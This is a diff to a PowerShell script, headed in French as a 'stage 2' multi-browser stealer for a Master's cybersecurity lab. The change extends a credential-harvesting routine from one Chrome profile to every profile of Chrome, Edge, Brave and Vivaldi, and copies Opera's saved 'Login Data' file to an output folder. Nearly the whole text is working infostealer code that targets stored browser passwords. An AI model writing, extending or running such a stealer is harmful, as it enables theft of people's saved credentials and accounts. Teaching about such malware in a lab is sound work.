@@ -1,5 +1,6 @@
 # ============================================
 # Stage 2 - Stealer Multi-Navigateurs
+# Tous les profils pour tous les navigateurs
 # Lab pedagogique Master Cybersecurite
 # ============================================
 
@@ -31,20 +32,13 @@ function Steal-Chromium($name, $basePath, $profileFilter) {
     }
 }
 
-# ---- NAVIGATEURS Chromium ----
-# Chrome → Profile 1 uniquement
-Steal-Chromium "Chrome" "$env:LOCALAPPDATA\Google\Chrome\User Data" "^Profile 1$"
+# ---- NAVIGATEURS Chromium → tous profils ----
+Steal-Chromium "Chrome"  "$env:LOCALAPPDATA\Google\Chrome\User Data"                    "^Default$|^Profile \d+$"
+Steal-Chromium "Edge"    "$env:LOCALAPPDATA\Microsoft\Edge\User Data"                   "^Default$|^Profile \d+$"
+Steal-Chromium "Brave"   "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"      "^Default$|^Profile \d+$"
+Steal-Chromium "Vivaldi" "$env:LOCALAPPDATA\Vivaldi\User Data"                          "^Default$|^Profile \d+$"
 
-# Edge → tous profils
-Steal-Chromium "Edge" "$env:LOCALAPPDATA\Microsoft\Edge\User Data" "^Default$|^Profile \d+$"
-
-# Brave → tous profils
-Steal-Chromium "Brave" "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" "^Default$|^Profile \d+$"
-
-# Vivaldi → tous profils
-Steal-Chromium "Vivaldi" "$env:LOCALAPPDATA\Vivaldi\User Data" "^Default$|^Profile \d+$"
-
-# Opera → profil unique (pas de sous-dossiers)
+# ---- OPERA ----
 $operaLogin = "$env:APPDATA\Opera Software\Opera Stable\Login Data"
 if (Test-Path $operaLogin) {
     Copy-Item $operaLogin "$output\Opera_LoginData" -Force
